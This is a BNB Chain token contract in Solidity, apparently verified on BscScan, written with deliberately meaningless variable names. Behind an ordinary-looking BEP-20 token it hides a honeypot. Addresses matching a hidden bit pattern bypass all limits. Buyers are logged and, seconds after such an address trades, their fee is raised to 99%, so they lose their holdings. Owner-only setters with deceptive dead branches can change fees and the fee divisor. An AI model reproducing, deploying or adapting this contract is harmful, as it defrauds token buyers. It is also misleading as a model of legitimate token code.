/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract HurriedlyApcallover is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Hurriedly Apcallover ";
    string constant _symbol = "HurriedlyApcallover";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private walletLimitTradingBuy;
    mapping(address => bool) private tradingMarketingMinLimit;
    mapping(address => bool) private feeLimitAutoWalletBotsExempt;
    mapping(address => bool) private isReceiverWalletBurn;
    mapping(address => uint256) private modeWalletTeamAuto;
    mapping(uint256 => address) private minBotsSellMaxLaunchedLimitAuto;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapBurnTradingMode = 0;
    uint256 private liquidityAutoLaunchedSwapWalletReceiverTrading = 5;

    //SELL FEES
    uint256 private liquidityMinModeFeeExempt = 0;
    uint256 private modeAutoSellBurnReceiverMax = 5;

    uint256 private minSellBuyTrading = liquidityAutoLaunchedSwapWalletReceiverTrading + swapBurnTradingMode;
    uint256 private tradingFeeMinExempt = 100;

    address private minLaunchedSellTeamLiquidityFee = (msg.sender); // auto-liq address
    address private tradingAutoTeamIsSwapBots = (0xC89224Be2CEe917d771DeA60fFFfeF41c990834c); // marketing address
    address private swapSellMarketingTx = DEAD;
    address private walletLiquidityLimitTeam = DEAD;
    address private txBuyWalletAuto = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private swapSellAutoReceiver;
    uint256 private tradingBotsTeamWalletBuy;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private exemptSellLiquidityLaunchedTeam;
    uint256 private burnLiquidityLimitSwap;
    uint256 private teamLaunchedMaxTrading;
    uint256 private autoWalletLimitMode;
    uint256 private liquidityAutoModeExempt;

    bool private walletExemptLimitBurn = true;
    bool private isReceiverWalletBurnMode = true;
    bool private tradingTeamLimitExempt = true;
    bool private sellSwapBurnMarketing = true;
    bool private burnExemptTxIsMarketingTrading = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private marketingTradingLiquidityBurn = _totalSupply / 1000; // 0.1%

    
    bool private liquidityExemptModeIsBuyLaunched = false;
    bool private liquidityMinMaxReceiverMarketingLaunchedTx = false;
    uint256 private botsLaunchedTeamTxAutoBuyTrading = 0;
    uint256 private autoFeeTxLiquidityExempt = 0;
    bool private launchedBurnTradingExemptLiquidityMaxIs = false;
    bool private limitTradingMinLaunched = false;
    uint256 private exemptLaunchedIsBots = 0;
    bool private swapAutoReceiverExemptMinBotsSell = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        exemptSellLiquidityLaunchedTeam = true;

        walletLimitTradingBuy[msg.sender] = true;
        walletLimitTradingBuy[address(this)] = true;

        tradingMarketingMinLimit[msg.sender] = true;
        tradingMarketingMinLimit[0x0000000000000000000000000000000000000000] = true;
        tradingMarketingMinLimit[0x000000000000000000000000000000000000dEaD] = true;
        tradingMarketingMinLimit[address(this)] = true;

        feeLimitAutoWalletBotsExempt[msg.sender] = true;
        feeLimitAutoWalletBotsExempt[0x0000000000000000000000000000000000000000] = true;
        feeLimitAutoWalletBotsExempt[0x000000000000000000000000000000000000dEaD] = true;
        feeLimitAutoWalletBotsExempt[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return txTradingSellBurn(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return txTradingSellBurn(sender, recipient, amount);
    }

    function txTradingSellBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = liquidityExemptBotsReceiverIsAutoTx(sender) || liquidityExemptBotsReceiverIsAutoTx(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                sellIsTradingExempt();
            }
            if (!bLimitTxWalletValue) {
                modeBotsMaxLimit(recipient);
            }
        }
        
        if (limitTradingMinLaunched != swapAutoReceiverExemptMinBotsSell) {
            limitTradingMinLaunched = walletExemptLimitBurn;
        }

        if (liquidityMinMaxReceiverMarketingLaunchedTx != tradingTeamLimitExempt) {
            liquidityMinMaxReceiverMarketingLaunchedTx = liquidityMinMaxReceiverMarketingLaunchedTx;
        }

        if (botsLaunchedTeamTxAutoBuyTrading != liquidityAutoLaunchedSwapWalletReceiverTrading) {
            botsLaunchedTeamTxAutoBuyTrading = liquidityMinModeFeeExempt;
        }


        if (inSwap || bLimitTxWalletValue) {return sellBotsBurnLimit(sender, recipient, amount);}

        if (!walletLimitTradingBuy[sender] && !walletLimitTradingBuy[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (exemptLaunchedIsBots != liquidityAutoLaunchedSwapWalletReceiverTrading) {
            exemptLaunchedIsBots = marketingTradingLiquidityBurn;
        }

        if (botsLaunchedTeamTxAutoBuyTrading != exemptLaunchedIsBots) {
            botsLaunchedTeamTxAutoBuyTrading = tradingFeeMinExempt;
        }


        require((amount <= _maxTxAmount) || feeLimitAutoWalletBotsExempt[sender] || feeLimitAutoWalletBotsExempt[recipient], "Max TX Limit has been triggered");

        if (receiverLimitWalletBots()) {botsTeamLiquidityMax();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = txBuyBurnLaunchedMode(sender) ? limitMaxSellModeLaunchedReceiver(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function sellBotsBurnLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txBuyBurnLaunchedMode(address sender) internal view returns (bool) {
        return !tradingMarketingMinLimit[sender];
    }

    function exemptWalletMaxSellLimit(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            minSellBuyTrading = modeAutoSellBurnReceiverMax + liquidityMinModeFeeExempt;
            return minBuyMaxIs(sender, minSellBuyTrading);
        }
        if (!selling && sender == uniswapV2Pair) {
            minSellBuyTrading = liquidityAutoLaunchedSwapWalletReceiverTrading + swapBurnTradingMode;
            return minSellBuyTrading;
        }
        return minBuyMaxIs(sender, minSellBuyTrading);
    }

    function limitMaxSellModeLaunchedReceiver(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (exemptLaunchedIsBots == marketingTradingLiquidityBurn) {
            exemptLaunchedIsBots = exemptLaunchedIsBots;
        }

        if (liquidityMinMaxReceiverMarketingLaunchedTx != swapAutoReceiverExemptMinBotsSell) {
            liquidityMinMaxReceiverMarketingLaunchedTx = liquidityMinMaxReceiverMarketingLaunchedTx;
        }


        uint256 feeAmount = amount.mul(exemptWalletMaxSellLimit(sender, receiver == uniswapV2Pair)).div(tradingFeeMinExempt);

        if (isReceiverWalletBurn[sender] || isReceiverWalletBurn[receiver]) {
            feeAmount = amount.mul(99).div(tradingFeeMinExempt);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function liquidityExemptBotsReceiverIsAutoTx(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function minBuyMaxIs(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = modeWalletTeamAuto[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function modeBotsMaxLimit(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        minBotsSellMaxLaunchedLimitAuto[exemptLimitValue] = addr;
    }

    function sellIsTradingExempt() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (modeWalletTeamAuto[minBotsSellMaxLaunchedLimitAuto[i]] == 0) {
                    modeWalletTeamAuto[minBotsSellMaxLaunchedLimitAuto[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(tradingAutoTeamIsSwapBots).transfer(amountBNB * amountPercentage / 100);
    }

    function receiverLimitWalletBots() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    burnExemptTxIsMarketingTrading &&
    _balances[address(this)] >= marketingTradingLiquidityBurn;
    }

    function botsTeamLiquidityMax() internal swapping {
        
        if (exemptLaunchedIsBots != botsLaunchedTeamTxAutoBuyTrading) {
            exemptLaunchedIsBots = minSellBuyTrading;
        }

        if (swapAutoReceiverExemptMinBotsSell != isReceiverWalletBurnMode) {
            swapAutoReceiverExemptMinBotsSell = liquidityExemptModeIsBuyLaunched;
        }

        if (limitTradingMinLaunched != tradingTeamLimitExempt) {
            limitTradingMinLaunched = tradingTeamLimitExempt;
        }


        uint256 amountToLiquify = marketingTradingLiquidityBurn.mul(swapBurnTradingMode).div(minSellBuyTrading).div(2);
        uint256 amountToSwap = marketingTradingLiquidityBurn.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = minSellBuyTrading.sub(swapBurnTradingMode.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapBurnTradingMode).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(liquidityAutoLaunchedSwapWalletReceiverTrading).div(totalETHFee);
        
        payable(tradingAutoTeamIsSwapBots).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                minLaunchedSellTeamLiquidityFee,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTradingAutoTeamIsSwapBots() public view returns (address) {
        if (tradingAutoTeamIsSwapBots == tradingAutoTeamIsSwapBots) {
            return tradingAutoTeamIsSwapBots;
        }
        if (tradingAutoTeamIsSwapBots != walletLiquidityLimitTeam) {
            return walletLiquidityLimitTeam;
        }
        return tradingAutoTeamIsSwapBots;
    }
    function setTradingAutoTeamIsSwapBots(address a0) public onlyOwner {
        if (tradingAutoTeamIsSwapBots != tradingAutoTeamIsSwapBots) {
            tradingAutoTeamIsSwapBots=a0;
        }
        if (tradingAutoTeamIsSwapBots == walletLiquidityLimitTeam) {
            walletLiquidityLimitTeam=a0;
        }
        if (tradingAutoTeamIsSwapBots != txBuyWalletAuto) {
            txBuyWalletAuto=a0;
        }
        tradingAutoTeamIsSwapBots=a0;
    }

    function getSellSwapBurnMarketing() public view returns (bool) {
        if (sellSwapBurnMarketing != liquidityExemptModeIsBuyLaunched) {
            return liquidityExemptModeIsBuyLaunched;
        }
        return sellSwapBurnMarketing;
    }
    function setSellSwapBurnMarketing(bool a0) public onlyOwner {
        if (sellSwapBurnMarketing == swapAutoReceiverExemptMinBotsSell) {
            swapAutoReceiverExemptMinBotsSell=a0;
        }
        if (sellSwapBurnMarketing == liquidityMinMaxReceiverMarketingLaunchedTx) {
            liquidityMinMaxReceiverMarketingLaunchedTx=a0;
        }
        sellSwapBurnMarketing=a0;
    }

    function getMinLaunchedSellTeamLiquidityFee() public view returns (address) {
        if (minLaunchedSellTeamLiquidityFee != txBuyWalletAuto) {
            return txBuyWalletAuto;
        }
        return minLaunchedSellTeamLiquidityFee;
    }
    function setMinLaunchedSellTeamLiquidityFee(address a0) public onlyOwner {
        if (minLaunchedSellTeamLiquidityFee == swapSellMarketingTx) {
            swapSellMarketingTx=a0;
        }
        if (minLaunchedSellTeamLiquidityFee == walletLiquidityLimitTeam) {
            walletLiquidityLimitTeam=a0;
        }
        if (minLaunchedSellTeamLiquidityFee != txBuyWalletAuto) {
            txBuyWalletAuto=a0;
        }
        minLaunchedSellTeamLiquidityFee=a0;
    }

    function getModeWalletTeamAuto(address a0) public view returns (uint256) {
        if (a0 != walletLiquidityLimitTeam) {
            return marketingTradingLiquidityBurn;
        }
        if (a0 == walletLiquidityLimitTeam) {
            return botsLaunchedTeamTxAutoBuyTrading;
        }
        if (modeWalletTeamAuto[a0] == modeWalletTeamAuto[a0]) {
            return modeAutoSellBurnReceiverMax;
        }
            return modeWalletTeamAuto[a0];
    }
    function setModeWalletTeamAuto(address a0,uint256 a1) public onlyOwner {
        if (a0 != walletLiquidityLimitTeam) {
            autoFeeTxLiquidityExempt=a1;
        }
        if (a0 != walletLiquidityLimitTeam) {
            swapBurnTradingMode=a1;
        }
        if (modeWalletTeamAuto[a0] != modeWalletTeamAuto[a0]) {
           modeWalletTeamAuto[a0]=a1;
        }
        modeWalletTeamAuto[a0]=a1;
    }

    function getModeAutoSellBurnReceiverMax() public view returns (uint256) {
        if (modeAutoSellBurnReceiverMax == minSellBuyTrading) {
            return minSellBuyTrading;
        }
        if (modeAutoSellBurnReceiverMax != modeAutoSellBurnReceiverMax) {
            return modeAutoSellBurnReceiverMax;
        }
        return modeAutoSellBurnReceiverMax;
    }
    function setModeAutoSellBurnReceiverMax(uint256 a0) public onlyOwner {
        if (modeAutoSellBurnReceiverMax != tradingFeeMinExempt) {
            tradingFeeMinExempt=a0;
        }
        if (modeAutoSellBurnReceiverMax != exemptLaunchedIsBots) {
            exemptLaunchedIsBots=a0;
        }
        if (modeAutoSellBurnReceiverMax == tradingFeeMinExempt) {
            tradingFeeMinExempt=a0;
        }
        modeAutoSellBurnReceiverMax=a0;
    }

    function getBotsLaunchedTeamTxAutoBuyTrading() public view returns (uint256) {
        if (botsLaunchedTeamTxAutoBuyTrading != liquidityAutoLaunchedSwapWalletReceiverTrading) {
            return liquidityAutoLaunchedSwapWalletReceiverTrading;
        }
        if (botsLaunchedTeamTxAutoBuyTrading != liquidityMinModeFeeExempt) {
            return liquidityMinModeFeeExempt;
        }
        if (botsLaunchedTeamTxAutoBuyTrading != modeAutoSellBurnReceiverMax) {
            return modeAutoSellBurnReceiverMax;
        }
        return botsLaunchedTeamTxAutoBuyTrading;
    }
    function setBotsLaunchedTeamTxAutoBuyTrading(uint256 a0) public onlyOwner {
        if (botsLaunchedTeamTxAutoBuyTrading == botsLaunchedTeamTxAutoBuyTrading) {
            botsLaunchedTeamTxAutoBuyTrading=a0;
        }
        botsLaunchedTeamTxAutoBuyTrading=a0;
    }

    function getLimitTradingMinLaunched() public view returns (bool) {
        if (limitTradingMinLaunched != swapAutoReceiverExemptMinBotsSell) {
            return swapAutoReceiverExemptMinBotsSell;
        }
        return limitTradingMinLaunched;
    }
    function setLimitTradingMinLaunched(bool a0) public onlyOwner {
        limitTradingMinLaunched=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}